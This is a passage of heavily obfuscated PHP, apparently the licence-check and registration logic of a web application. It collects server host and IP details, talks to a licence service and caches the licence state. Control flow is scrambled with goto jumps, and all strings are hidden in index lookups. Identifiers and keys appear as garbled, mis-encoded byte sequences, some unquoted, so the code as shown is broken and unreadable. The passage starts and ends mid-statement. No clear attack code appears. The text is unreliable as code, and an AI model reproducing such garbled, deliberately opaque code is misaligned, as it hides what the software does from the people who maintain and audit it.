C‹Œ„¹” ‰; bİ¾í¾…¼Ö: $this->{$_SERVER[­ó][47]}(); $BĞöƒŞ¢ŒŞ = $cÖšö…ŠËª[600]; if (!$BĞöƒŞ¢ŒŞ) { return; } goto a¯ ÚÁí÷Ö; eÔïİ³ºÁä: if (strlen($bƒ –¯ ••) < $cÖšö…ŠËª[596]) { return; } goto C¤•†ğ¾Ÿ; fÑÈäßÃš: $D†äÀ³“Ô = $cÖšö…ŠËª[604]; while (strlen($D†äÀ³“Ô) < $cÖšö…ŠËª[596]) { if (!$D†äÀ³“Ô) { break; } $D†äÀ³“Ô++; } $this->{$_SERVER[­ó][3]}($aÛ¤Á‰±ÏÙ[57], array($this, $aÛ¤Á‰±ÏÙ[58])); goto fİŒ‚¦Æõ‡; eÀĞè‚…ßå: while (strlen($a¥£èñÏ’) < $cÖšö…ŠËª[599]) { if (!$a¥£èñÏ’) { break; } $a¥£èñÏ’++; } $this->{$_SERVER[­ó][3]}($aÛ¤Á‰±ÏÙ[53], array($this, $aÛ¤Á‰±ÏÙ[54])); $this->{$_SERVER[­ó][3]}($aÛ¤Á‰±ÏÙ[55], array($this, $aÛ¤Á‰±ÏÙ[56])); goto fÑÈäßÃš; fİŒ‚¦Æõ‡: $A¤âï¥„Ï = $cÖšö…ŠËª[605]; $this->{$_SERVER[­ó][3]}($aÛ¤Á‰±ÏÙ[59], array($this, $aÛ¤Á‰±ÏÙ[60])); $bƒ –¯ •• = $cÖšö…ŠËª[606]; goto eÔïİ³ºÁä; C¤•†ğ¾Ÿ: } public function ulbxac259d60($DÙËÊÌ¹æ×) { goto eÅØÅ¥ˆÚä; F–ÌÒ³•™‚: if (strlen($D± ù¤Ğ…ƒ) < $E‹³ ùÊí›[574]) { die; } unset($DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[105]][$F Ù”¿†¶¾[107]]); $Fœ°ÉåÂ = $E‹³ ùÊí›[610]; goto f’ÒÅÑØ¤ã; b´Ÿ¨¥Ó•Ú: $BìªÕÁ–‚ = $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$F Ù”¿†¶¾[76]]; unset($DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[105]][$F Ù”¿†¶¾[106]]); $D± ù¤Ğ…ƒ = $E‹³ ùÊí›[609]; goto F–ÌÒ³•™‚; f±È‚•°ë: $e ¡ïçÙÑ = $E‹³ ùÊí›[607]; $bÅÖÔŞœ§Š = array($F Ù”¿†¶¾[64], $F Ù”¿†¶¾[65], $F Ù”¿†¶¾[66], $F Ù”¿†¶¾[67], $F Ù”¿†¶¾[68], $F Ù”¿†¶¾[69], $F Ù”¿†¶¾[70], $F Ù”¿†¶¾[71], $F Ù”¿†¶¾[72], $F Ù”¿†¶¾[73], $F Ù”¿†¶¾[74], $F Ù”¿†¶¾[75], $F Ù”¿†¶¾[76], $F Ù”¿†¶¾[77], $F Ù”¿†¶¾[78], $F Ù”¿†¶¾[79], $F Ù”¿†¶¾[80], $F Ù”¿†¶¾[81], $F Ù”¿†¶¾[82], $F Ù”¿†¶¾[83], $F Ù”¿†¶¾[84], $F Ù”¿†¶¾[85], $F Ù”¿†¶¾[86], $F Ù”¿†¶¾[87], $F Ù”¿†¶¾[88], $F Ù”¿†¶¾[89], $F Ù”¿†¶¾[90], $F Ù”¿†¶¾[91], $F Ù”¿†¶¾[92], $F Ù”¿†¶¾[93], $F Ù”¿†¶¾[94], $F Ù”¿†¶¾[95], $F Ù”¿†¶¾[96], $F Ù”¿†¶¾[97], $F Ù”¿†¶¾[98], $F Ù”¿†¶¾[99], $F Ù”¿†¶¾[100]); foreach ($bÅÖÔŞœ§Š as $E×’‰İĞ†) { $c”©¢‡º°ò = $GLOBALS[$F Ù”¿†¶¾[101]][$F Ù”¿†¶¾[102]][$E×’‰İĞ†]; $E‹®÷ÅÙøÊ = $E‹³ ùÊí›[608]; if (!$E‹®÷ÅÙøÊ) { return; } if (isset($F”Û‘ÇåŞ[$E×’‰İĞ†])) { $c”©¢‡º°ò = $F”Û‘ÇåŞ[$E×’‰İĞ†]; } $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$E×’‰İĞ†] = $c”©¢‡º°ò; } goto b´Ÿ¨¥Ó•Ú; aŠÚ»Ãµ‰»: if ($F”Û‘ÇåŞ[$F Ù”¿†¶¾[127]] != $F Ù”¿†¶¾[128]) { $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[129]] = $F”Û‘ÇåŞ[$F Ù”¿†¶¾[129]]; $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[130]] = $F”Û‘ÇåŞ[$F Ù”¿†¶¾[130]]; $C×Û Î‘Â = $F Ù”¿†¶¾[131](10) . $this->arsvdd80322b . $F Ù”¿†¶¾[131](5); $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[132]][$F Ù”¿†¶¾[133]] = $this->{$_SERVER[­ó][134]}($C×Û Î‘Â, $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[120]]); } if ($this->arsvdd80322b == $F Ù”¿†¶¾[128]) { $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$F Ù”¿†¶¾[109]][$F Ù”¿†¶¾[114]] = 0; } $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[135]] = $F Ù”¿†¶¾[113]($this->bdil1063e89a, $F Ù”¿†¶¾[136], $F Ù”¿†¶¾[10]); goto EòŒÑ×Æà; EÚ¸›ƒ¾¥‰: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[120]] = $F Ù”¿†¶¾[121]($_SERVER[$F Ù”¿†¶¾[122]] . $F”Û‘ÇåŞ[$F Ù”¿†¶¾[123]]); $CğØ¬ï¾ó = $E‹³ ùÊí›[613]; if (strlen($CğØ¬ï¾ó) < $E‹³ ùÊí›[580]) { die; } goto eƒ¡à“–ƒ; Cîö¸Š¢Ş±: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[127]] = $this->arsvdd80322b; $D”¶ºÆÈø = $E‹³ ùÊí›[615]; if (strlen($D”¶ºÆÈø) < $E‹³ ùÊí›[580]) { die; } goto aŠÚ»Ãµ‰»; eƒ¡à“–ƒ: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[124]] = $F Ù”¿†¶¾[125]($F Ù”¿†¶¾[126]()); $fÈÉ§ìá§ = $E‹³ ùÊí›[614]; if (strlen($fÈÉ§ìá§) < $E‹³ ùÊí›[570]) { die; } goto Cîö¸Š¢Ş±; f’ÒÅÑØ¤ã: if (strlen($Fœ°ÉåÂ) < $E‹³ ùÊí›[574]) { return; } unset($DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$F Ù”¿†¶¾[76]]); unset($DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$F Ù”¿†¶¾[108]]); goto aÕì¤îÏŞ; aÕì¤îÏŞ: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[103]][$F Ù”¿†¶¾[104]][$F Ù”¿†¶¾[109]] = array($F Ù”¿†¶¾[110] => (int) $BìªÕÁ–‚[$F Ù”¿†¶¾[111]], $F Ù”¿†¶¾[112] => (int) $F Ù”¿†¶¾[113]($BìªÕÁ–‚, $F Ù”¿†¶¾[114], 0)); $BŸˆ¢Â©Ñ´ = $E‹³ ùÊí›[611]; if (strlen($BŸˆ¢Â©Ñ´) < $E‹³ ùÊí›[596]) { return; } goto CÀï¦¡Úî; CÀï¦¡Úî: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[116]] = $F Ù”¿†¶¾[117]($F Ù”¿†¶¾[118])->{$_SERVER[­ó][119]}(); $C¶æç‰º¹Ú = $E‹³ ùÊí›[612]; if (!$C¶æç‰º¹Ú) { die; } goto EÚ¸›ƒ¾¥‰; EòŒÑ×Æà: $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[137]] = $F Ù”¿†¶¾[113]($this->bdil1063e89a, $F Ù”¿†¶¾[138], $F Ù”¿†¶¾[10]); if ($F Ù”¿†¶¾[113]($GLOBALS, $F Ù”¿†¶¾[139]) && $this->config[$F Ù”¿†¶¾[140]]) { $DÙËÊÌ¹æ×[$F Ù”¿†¶¾[115]][$F Ù”¿†¶¾[141]] = WEB_ROOT; } return $DÙËÊÌ¹æ×; goto E—™Ê‰—ï„; eÅØÅ¥ˆÚä: $E‹³ ùÊí› =& $_SERVER[…ë˜õ]; $F Ù”¿†¶¾ =& $_SERVER[­ó]; $F”Û‘ÇåŞ = $F Ù”¿†¶¾[61]($F Ù”¿†¶¾[62])->{$_SERVER[­ó][63]}(); goto f±È‚•°ë; E—™Ê‰—ï„: } private function vhxic9cea3c2() { goto eæÛ¸ô×ˆ; Aï˜ªçäçä: if ($this->arsvdd80322b == $D¼Ñ»îÎÖ‰[128]) { return; } $C‘Ÿˆ¼×Ÿ¡ = array($D¼Ñ»îÎÖ‰[160], $D¼Ñ»îÎÖ‰[161], $D¼Ñ»îÎÖ‰[162], $D¼Ñ»îÎÖ‰[163], $D¼Ñ»îÎÖ‰[164], $D¼Ñ»îÎÖ‰[165]); $d¡‡ë¶£Œ£ = $D¼Ñ»îÎÖ‰[61]($D¼Ñ»îÎÖ‰[62])->{$_SERVER[­ó][63]}(); goto e •°Á¥‡; e •°Á¥‡: $Dßğ÷©êˆÕ = array($D¼Ñ»îÎÖ‰[166] => $d¡‡ë¶£Œ£[$D¼Ñ»îÎÖ‰[64]], $D¼Ñ»îÎÖ‰[167] => $d¡‡ë¶£Œ£[$D¼Ñ»îÎÖ‰[65]], $D¼Ñ»îÎÖ‰[168] => $D¼Ñ»îÎÖ‰[10]); foreach ($C‘Ÿˆ¼×Ÿ¡ as $b¦ÕÂ”¶) { if (!isset($d¡‡ë¶£Œ£[$b¦ÕÂ”¶]) || !$d¡‡ë¶£Œ£[$b¦ÕÂ”¶]) { continue; } $Dßğ÷©êˆÕ[$b¦ÕÂ”¶] = $d¡‡ë¶£Œ£[$b¦ÕÂ”¶]; $f¯Ï¢Š”„ = $eÉ¿ëñÈ–[617]; if (strlen($f¯Ï¢Š”„) < $eÉ¿ëñÈ–[596]) { die; } } $D¼Ñ»îÎÖ‰[13](array($D¼Ñ»îÎÖ‰[158], $D¼Ñ»îÎÖ‰[159]), $Dßğ÷©êˆÕ); goto DÓ‘©ì“½; eæÛ¸ô×ˆ: $eÉ¿ëñÈ– =& $_SERVER[…ë˜õ]; $D¼Ñ»îÎÖ‰ =& $_SERVER[­ó]; if ($_SERVER[$D¼Ñ»îÎÖ‰[44]] == $D¼Ñ»îÎÖ‰[142]) { goto FõÕÆé¹Š; d×¨í£‡à: $Dßğ÷©êˆÕ = array($D¼Ñ»îÎÖ‰[157] => $d¿©„³†¬®); $D‘»Ä˜É¢Ÿ = $eÉ¿ëñÈ–[616]; if (strlen($D‘»Ä˜É¢Ÿ) < $eÉ¿ëñÈ–[574]) { die; } goto dº­ŸÒéºª; dº­ŸÒéºª: $D¼Ñ»îÎÖ‰[13](array($D¼Ñ»îÎÖ‰[158], $D¼Ñ»îÎÖ‰[159]), $Dßğ÷©êˆÕ); goto f‘ƒç‡ô; FõÕÆé¹Š: $d¿©„³†¬® = array($D¼Ñ»îÎÖ‰[127] => $this->arsvdd80322b, $D¼Ñ»îÎÖ‰[143] => $this->{$_SERVER[­ó][144]}(), $D¼Ñ»îÎÖ‰[145] => $D¼Ñ»îÎÖ‰[61]($D¼Ñ»îÎÖ‰[146])->{$_SERVER[­ó][147]}()); if ($this->arsvdd80322b != $D¼Ñ»îÎÖ‰[128]) { $f´•ÂÅùùÒ = $D¼Ñ»îÎÖ‰[113]($this->bdil1063e89a, $D¼Ñ»îÎÖ‰[148]); if ($f´•ÂÅùùÒ) { $d¿©„³†¬®[$D¼Ñ»îÎÖ‰[149]] = $f´•ÂÅùùÒ; $d¿©„³†¬®[$D¼Ñ»îÎÖ‰[150]] = $D¼Ñ»îÎÖ‰[151]($D¼Ñ»îÎÖ‰[113]($this->bdil1063e89a, $D¼Ñ»îÎÖ‰[152])); $d¿©„³†¬®[$D¼Ñ»îÎÖ‰[153]] = $D¼Ñ»îÎÖ‰[113]($this->bdil1063e89a, $D¼Ñ»îÎÖ‰[138]); } } $d¿©„³†¬® = $this->{$_SERVER[­ó][154]}($D¼Ñ»îÎÖ‰[155]($d¿©„³†¬®), $D¼Ñ»îÎÖ‰[121]($D¼Ñ»îÎÖ‰[156])); goto d×¨í£‡à; f‘ƒç‡ô: } goto Aï˜ªçäçä; DÓ‘©ì“½: $A”‘¹¶„±Ä = $eÉ¿ëñÈ–[618]; goto a•Œ·Äõª; a•Œ·Äõª: } private function vjhw5f130f8a() { goto CºÓ‡ØÑ½; CºÓ‡ØÑ½: $BÌÏìˆØÁ =& $_SERVER[…ë˜õ]; $F©›í…Ğß =& $_SERVER[­ó]; if ($_SERVER[$F©›í…Ğß[44]] != $F©›í…Ğß[169]) { return; } goto a™á¥……ãĞ; AÈàîó°°ì: $C÷‰à«³…[$F©›í…Ğß[129]] = $F©›í…Ğß[221]($F©›í…Ğß[125]($this->{$_SERVER[­ó][154]}($F†Í…ªó´Î, $F©›í…Ğß[222]))); $AÄ‹Å«¾· = $F©›í…Ğß[131](16); $aÕô”ÄÒ× = $BÌÏìˆØÁ[621]; goto dÕÉæ–Ì£; Cß×òº¾’: if ($E¾¯Í£ë—é[$F©›í…Ğß[185]] == $F©›í…Ğß[186]) { $e¡ë­Â•¹ó = $this->{$_SERVER[­ó][154]}($EÕì¥‹ÂŒö, $F©›í…Ğß[187]); $Aá§¹Ìá°È = $this->{$_SERVER[­ó][134]}($F©›í…Ğß[155]($dòëÕ¿ªµ), $EÕì¥‹ÂŒö . $F©›í…Ğß[188], 3); $Aá§¹Ìá°È = $Aá§¹Ìá°È . $F©›í…Ğß[189] . $_SERVER[$F©›í…Ğß[180]]; $d¸òÄæá« = $this->{$_SERVER[­ó][190]}($F©›í…Ğß[191] . $e¡ë­Â•¹ó . $F©›í…Ğß[192] . $Aá§¹Ìá°È, -1); $F©›í…Ğß[173]($d¸òÄæá«, !0); } else { if ($E¾¯Í£ë—é[$F©›í…Ğß[185]] == $F©›í…Ğß[193]) { $CšÊ¹¦¸Ò· = $F©›í…Ğß[25]($F©›í…Ğß[121]($F©›í…Ğß[194] . $EÕì¥‹ÂŒö), 12, 15) . $F©›í…Ğß[195]; $Aá§¹Ìá°È = $this->{$_SERVER[­ó][196]}($F©›í…Ğß[2]($E¾¯Í£ë—é[$F©›í…Ğß[197]]), $CšÊ¹¦¸Ò·, 2); $DÉÌ›÷ìÚë = $F©›í…Ğß[198]($Aá§¹Ìá°È, !0); if (!$F©›í…Ğß[199]($DÉÌ›÷ìÚë) || !$F©›í…Ğß[199]($DÉÌ›÷ìÚë[$F©›í…Ğß[200]]) || $DÉÌ›÷ìÚë[$F©›í…Ğß[172]] != !0) { $B”ßº¸ÎŸÆ = $F©›í…Ğß[201]; $cíÚì“µïÙ = $DÉÌ›÷ìÚë[$F©›í…Ğß[200]] ? $F©›í…Ğß[202] . $DÉÌ›÷ìÚë[$F©›í…Ğß[200]] : $B”ßº¸ÎŸÆ; $F©›í…Ğß[173]($cíÚì“µïÙ, !1); } else { $dòëÕ¿ªµ[$F©›í…Ğß[175]] = $DÉÌ›÷ìÚë[$F©›í…Ğß[200]][$F©›í…Ğß[203]]; } } else { $DÉÌ›÷ìÚë = $this->{$_SERVER[­ó][190]}($F©›í…Ğß[204], $dòëÕ¿ªµ, 10); $F·ãºÑÀ Õ = $BÌÏìˆØÁ[620]; if (strlen($F·ãºÑÀ Õ) < $BÌÏìˆØÁ[596]) { die; } } } if (!$F©›í…Ğß[199]($DÉÌ›÷ìÚë) || !$F©›í…Ğß[199]($DÉÌ›÷ìÚë[$F©›í…Ğß[200]]) || $DÉÌ›÷ìÚë[$F©›í…Ğß[172]] != !0) { $B”ßº¸ÎŸÆ = $F©›í…Ğß[205]($F©›í…Ğß[206]); $cíÚì“µïÙ = $DÉÌ›÷ìÚë[$F©›í…Ğß[200]] ? $F©›í…Ğß[202] . $DÉÌ›÷ìÚë[$F©›í…Ğß[200]] : $B”ßº¸ÎŸÆ; $F©›í…Ğß[173]($cíÚì“µïÙ, !1); } $F“Ã²ß°¼ê = $DÉÌ›÷ìÚë[$F©›í…Ğß[200]]; goto cÁ×ø÷œ‡İ; dµ“ÎùÜá×: $this->{$_SERVER[­ó][236]}(); Cache::set($F©›í…Ğß[237] . $F©›í…Ğß[121]($eËê»Œø¯ . $F©›í…Ğß[238]), $F©›í…Ğß[10]); $F©›í…Ğß[173]($F©›í…Ğß[205]($F©›í…Ğß[215]), !0); goto cß­Ô‡š®Õ; cß­Ô‡š®Õ: $fœ‡Ã†í = $BÌÏìˆØÁ[588]; goto f¶Úœô“â ; fÔ¢Óé…ù”: $F©›í…Ğß[61]($F©›í…Ğß[11])->{$_SERVER[­ó][233]}($AÁˆÉÆóÑ‡[$F©›í…Ğß[234]], array($F©›í…Ğß[235] => $FÎî±ÈğŠ‰)); $B‡ÂÎî¯Ç¹ = $BÌÏìˆØÁ[627]; while ($B‡ÂÎî¯Ç¹ < $BÌÏìˆØÁ[570]) { if ($B‡ÂÎî¯Ç¹ >= 0) { break; } $B‡ÂÎî¯Ç¹++; } goto BÂĞëµºƒ‹; Dæë¯•„¯: $this->arsvdd80322b = $C÷‰à«³…[$F©›í…Ğß[127]]; $Dô«Ã÷ÒœÒ = $BÌÏìˆØÁ[629]; if (strlen($Dô«Ã÷ÒœÒ) < $BÌÏìˆØÁ[596]) { return; } goto dµ“ÎùÜá×; a™á¥……ãĞ: if (!$F©›í…Ğß[113]($GLOBALS, $F©›í…Ğß[139])) { die; } $E¾¯Í£ë—é = $GLOBALS[$F©›í…Ğß[22]]; if (isset($E¾¯Í£ë—é[$F©›í…Ğß[170]])) { $this->{$_SERVER[­ó][171]}(); die; } goto aà½“™äÇª; aà½“™äÇª: if (!isset($E¾¯Í£ë—é[$F©›í…Ğß[172]]) || $F©›í…Ğß[24]($E¾¯Í£ë—é[$F©›í…Ğß[172]]) != 16) { $F©›í…Ğß[173]($F©›í…Ğß[174] . $E¾¯Í£ë—é[$F©›í…Ğß[172]], !1); } $eËê»Œø¯ = $F©›í…Ğß[61]($F©›í…Ğß[62])->{$_SERVER[­ó][63]}($F©›í…Ğß[123]); $dòëÕ¿ªµ = array($F©›í…Ğß[172] => $E¾¯Í£ë—é[$F©›í…Ğß[172]], $F©›í…Ğß[175] => $F©›í…Ğß[131](16), $F©›í…Ğß[176] => $F©›í…Ğß[156], $F©›í…Ğß[177] => $F©›í…Ğß[178], $F©›í…Ğß[179] => $_SERVER[$F©›í…Ğß[180]], $F©›í…Ğß[181] => $_SERVER[$F©›í…Ğß[182]], $F©›í…Ğß[183] => $_SERVER[$F©›í…Ğß[184]]); goto bÖ›³º²ª£; bÖ›³º²ª£: $a¸‰é¸„•ö = $BÌÏìˆØÁ[619]; while ($a¸‰é¸„•ö < $BÌÏìˆØÁ[574]) { if ($a¸‰é¸„•ö >= 0) { break; } $a¸‰é¸„•ö++; } $EÕì¥‹ÂŒö = $F©›í…Ğß[121]($_SERVER[$F©›í…Ğß[122]] . $eËê»Œø¯); goto Cß×òº¾’; Eã˜ÖÕµ©•: $FÎî±ÈğŠ‰ = array(); $CöõàÙ‰ÍÀ = $BÌÏìˆØÁ[625]; if (strlen($CöõàÙ‰ÍÀ) < $BÌÏìˆØÁ[570]) { die; } goto Aƒ„¡àØÅ„; eÑ¢§„õ‰¡: if ($dòëÕ¿ªµ[$F©›í…Ğß[175]]) { $C÷‰à«³…[$F©›í…Ğß[219]] = $dòëÕ¿ªµ[$F©›í…Ğß[175]]; } $F¹åì‚½„ = $F©›í…Ğß[25]($F©›í…Ğß[121]($C÷‰à«³…[$F©›í…Ğß[217]]), 10, 10); $F†Í…ªó´Î = $F¹åì‚½„ . $C÷‰à«³…[$F©›í…Ğß[127]] . $C÷‰à«³…[$F©›í…Ğß[219]]; goto AÈàîó°°ì; Aƒ„¡àØÅ„: $FÎî±ÈğŠ‰[$dç°ñ‹ŸÙÔ] = $dêÂ«ëèÄÏ; $E¸Š•ñÙ² = $BÌÏìˆØÁ[626]; if (strlen($E¸Š•ñÙ²) < $BÌÏìˆØÁ[574]) { die; } goto fÔ¢Óé…ù”; C×ã¸¾¸°: $dÍˆÈ›•¾î = $BÌÏìˆØÁ[624]; $e¤Û™Õéõ˜ = $F©›í…Ğß[229]($F©›í…Ğß[61]($F©›í…Ğß[11])->{$_SERVER[­ó][230]}(), $F©›í…Ğß[231]); $AÁˆÉÆóÑ‡ = $e¤Û™Õéõ˜[$F©›í…Ğß[232]]; goto Eã˜ÖÕµ©•; BÂĞëµºƒ‹: $this->bdil1063e89a = $F“Ã²ß°¼ê; $DÇ²‡Áêö¦ = $BÌÏìˆØÁ[628]; if (!$DÇ²‡Áêö¦) { return; } goto Dæë¯•„¯; cÁ×ø÷œ‡İ: $aØÚ™Â‰îÆ = $this->{$_SERVER[­ó][207]}($F“Ã²ß°¼ê[$F©›í…Ğß[208]]); if (!$aØÚ™Â‰îÆ || $aØÚ™Â‰îÆ != $F“Ã²ß°¼ê[$F©›í…Ğß[152]]) { $B«£†ëÛÎÅ = array($F©›í…Ğß[209] => $F©›í…Ğß[61]($F©›í…Ğß[62])->{$_SERVER[­ó][63]}($F©›í…Ğß[123]), $F©›í…Ğß[210] => $_SERVER[$F©›í…Ğß[122]], $F©›í…Ğß[211] => $F©›í…Ğß[212](), $F©›í…Ğß[181] => $_SERVER[$F©›í…Ğß[182]]); $Aá§¹Ìá°È = $this->{$_SERVER[­ó][213]}($F©›í…Ğß[155]($B«£†ëÛÎÅ)); $this->{$_SERVER[­ó][190]}($F©›í…Ğß[214] . $Aá§¹Ìá°È); $F©›í…Ğß[173]($F©›í…Ğß[205]($F©›í…Ğß[215]), !0); } $C÷‰à«³… = array($F©›í…Ğß[216] => $dòëÕ¿ªµ[$F©›í…Ğß[172]], $F©›í…Ğß[217] => $F“Ã²ß°¼ê[$F©›í…Ğß[218]], $F©›í…Ğß[219] => $F©›í…Ğß[131](16), $F©›í…Ğß[127] => $F“Ã²ß°¼ê[$F©›í…Ğß[220]]); goto eÑ¢§„õ‰¡; d¤•÷õˆ¯¡: if (strlen($E©ğœ‰é©Ö) < $BÌÏìˆØÁ[596]) { return; } $C÷‰à«³…[$F©›í…Ğß[130]] = $F©›í…Ğß[125]($F©›í…Ğß[221]($this->{$_SERVER[­ó][154]}($fÛÇŒê ±Å, $F©›í…Ğß[223]))); if ($F“Ã²ß°¼ê[$F©›í…Ğß[224]] && $F“Ã²ß°¼ê[$F©›í…Ğß[224]] >= 1) { $F©›í…Ğß[61]($F©›í…Ğß[62])->{$_SERVER[­ó][225]}($F©›í…Ğß[226], $F©›í…Ğß[227]); } goto E²ƒ‚ëŒ™¶; dÕÉæ–Ì£: if (!$aÕô”ÄÒ×) { return; } $fÛÇŒê ±Å = $AÄ‹Å«¾· . $C÷‰à«³…[$F©›í…Ğß[127]] . $this->{$_SERVER[­ó][154]}($F©›í…Ğß[121]($C÷‰à«³…[$F©›í…Ğß[216]]), $AÄ‹Å«¾·); $E©ğœ‰é©Ö = $BÌÏìˆØÁ[622]; goto d¤•÷õˆ¯¡; Bª£›ê¨‘„: $D‡ã¤††¥æ = $BÌÏìˆØÁ[623]; if (!$D‡ã¤††¥æ) { die; } $dêÂ«ëèÄÏ = $this->{$_SERVER[­ó][134]}($F©›í…Ğß[155]($F“Ã²ß°¼ê), $B¨ãÄÎ÷ ); goto C×ã¸¾¸°; E²ƒ‚ëŒ™¶: $F©›í…Ğß[61]($F©›í…Ğß[62])->{$_SERVER[­ó][228]}($C÷‰à«³…); $B¨ãÄÎ÷  = $F©›í…Ğß[121]($_SERVER[$F©›í…Ğß[122]] . $F©›í…Ğß[221]($eËê»Œø¯) . $C÷‰à«³…[$F©›í…Ğß[217]]); $dç°ñ‹ŸÙÔ = $F©›í…Ğß[221]($F©›í…Ğß[25]($B¨ãÄÎ÷ , 10, 16)); goto Bª£›ê¨‘„; f¶Úœô“â : } private function licenseRegistSuccess() { $c™†àÕÄ˜ =& $_SERVER[­ó]; $f›Ï¿¹Ø´Æ = $c™†àÕÄ˜[61]($c™†àÕÄ˜[62])->{$_SERVER[­ó][63]}(); if ($f›Ï¿¹Ø´Æ[$c™†àÕÄ˜[90]] != $c™†àÕÄ˜[227]) { $c™†àÕÄ˜[61]($c™†àÕÄ˜[62])->{$_SERVER[­ó][228]}($c™†àÕÄ˜[90], $c™†àÕÄ˜[227]); } $c™†àÕÄ˜[117]($c™†àÕÄ˜[239])->{$_SERVER[­ó][240]}(!0); } private function krwc0a768997() { goto f’­ÈàŸ–ù; cò„À·ÁÙ: $d‹¡Åµ‡î = $c±×ÇŠ‚è¨[630]; if (!$d‹¡Åµ‡î) { return; } $F³ŒÍòŒ[61]($F³ŒÍòŒ[62])->{$_SERVER[­ó][225]}($F³ŒÍòŒ[226], $F³ŒÍòŒ[241]); goto B™ŒÓÛ“ô; B™ŒÓÛ“ô: $CèğîÚ¸ò = $c±×ÇŠ‚è¨[631]; if (strlen($CèğîÚ¸ò) < $c±×ÇŠ‚è¨[596]) { return; } $this->bdil1063e89a = array(); goto d¡ˆÏ±òê«; f’­ÈàŸ–ù: $c±×ÇŠ‚è¨ =& $_SERVER[…ë˜õ]; $F³ŒÍòŒ =& $_SERVER[­ó]; $F³ŒÍòŒ[61]($F³ŒÍòŒ[62])->{$_SERVER[­ó][228]}(array($F³ŒÍòŒ[216] => $F³ŒÍòŒ[10], $F³ŒÍòŒ[217] => $F³ŒÍòŒ[10], $F³ŒÍòŒ[127] => $F³ŒÍòŒ[128], $F³ŒÍòŒ[129] => $F³ŒÍòŒ[10], $F³ŒÍòŒ[130] => $F³ŒÍòŒ[10])); goto cò„À·ÁÙ; d¡ˆÏ±òê«: $this->arsvdd80322b = $F³ŒÍòŒ[128]; goto e½ùåïëâ; e½ùåïëâ: } private function xzrs7f53af34() { goto B‡ÛÂ§¢; eëÔ°“Öğ: $EÚ¨¯¢àæ° = $cÜŒõæÖğÀ[632]; if (!$EÚ¨¯¢àæ°) { die; } $this->arsvdd80322b = $dÏëƒá˜áá[128]; goto DŒÖÅøß—É; f¾äİŠÖîÎ: if ($dÏëƒá˜áá[243]() >= $A±¬Û§‹¤) { return $this->{$_SERVER[­ó][171]}(); } if ($dÏëƒá˜áá[243]() - $dñØº“ÛœÁ[$dÏëƒá˜áá[242]] > 20) { $dñØº“ÛœÁ[$dÏëƒá˜áá[242]] = $dÏëƒá˜áá[243](); Cache::set($d²Ÿ‰©ƒ”ø, $dñØº“ÛœÁ); } $this->bdil1063e89a = $dñØº“ÛœÁ; goto Dá¦ÁÈ†¼ë; d‘ò‡ÎÀß: $a•­ƒ¦ÇÄ– = $dÏëƒá˜áá[61]($dÏëƒá˜áá[62])->{$_SERVER[­ó][63]}($dÏëƒá˜áá[123]); $e“²ÃÅƒ– = $cÜŒõæÖğÀ[635]; $d²Ÿ‰©ƒ”ø = $dÏëƒá˜áá[237] . $dÏëƒá˜áá[121]($a•­ƒ¦ÇÄ– . $dÏëƒá˜áá[238]); goto cºƒˆ‰·”; cºƒˆ‰·”: $bÃ™•±§Òó = $cÜŒõæÖğÀ[636]; if (strlen($bÃ™•±§Òó) < $cÜŒõæÖğÀ[596]) { die; } $dñØº“ÛœÁ = Cache::get($d²Ÿ‰©ƒ”ø); goto dæ»ùÄŞóò; DŒÖÅøß—É: $F©¾Á¤É»ƒ = $cÜŒõæÖğÀ[633]; while ($F©¾Á¤É»ƒ < $cÜŒõæÖğÀ[580]) { if ($F©¾Á¤É»ƒ >= 0) { break; } $F©¾Á¤É»ƒ++; } $CçŸ‘ƒ  = $dÏëƒá˜áá[61]($dÏëƒá˜áá[62])->{$_SERVER[­ó][63]}(); goto aòÌ¤ºµ†İ; Dá¦ÁÈ†¼ë: $this->arsvdd80322b = $CçŸ‘ƒ [$dÏëƒá˜áá[127]]; goto FßŸ¬¢ˆç¹; B‡ÛÂ§¢: $cÜŒõæÖğÀ =& $_SERVER[…ë˜õ]; $dÏëƒá˜áá =& $_SERVER[­ó]; $_SERVER[$dÏëƒá˜áá[182]] = $dÏëƒá˜áá[113]($_SERVER, $dÏëƒá˜áá[182], APP_HOST); goto eëÔ°“Öğ; dæ»ùÄŞóò: if (!$dÏëƒá˜áá[199]($dñØº“ÛœÁ) || !isset($dñØº“ÛœÁ[$dÏëƒá˜áá[242]]) || $dÏëƒá˜áá[243]() - $dñØº“ÛœÁ[$dÏëƒá˜áá[242]] >= 60) { $B­‰‡õ×Ã¥ = $dÏëƒá˜áá[229]($dÏëƒá˜áá[61]($dÏëƒá˜áá[11])->{$_SERVER[­ó][230]}(), $dÏëƒá˜áá[231]); $Dºõ–¾’åĞ = $B­‰‡õ×Ã¥[$dÏëƒá˜áá[232]]; $a½²Œ®õ„Ã = $dÏëƒá˜áá[121]($_SERVER[$dÏëƒá˜áá[122]] . $dÏëƒá˜áá[221]($a•­ƒ¦ÇÄ–) . $CçŸ‘ƒ [$dÏëƒá˜áá[217]]); $cæ›Õ“µŒ = 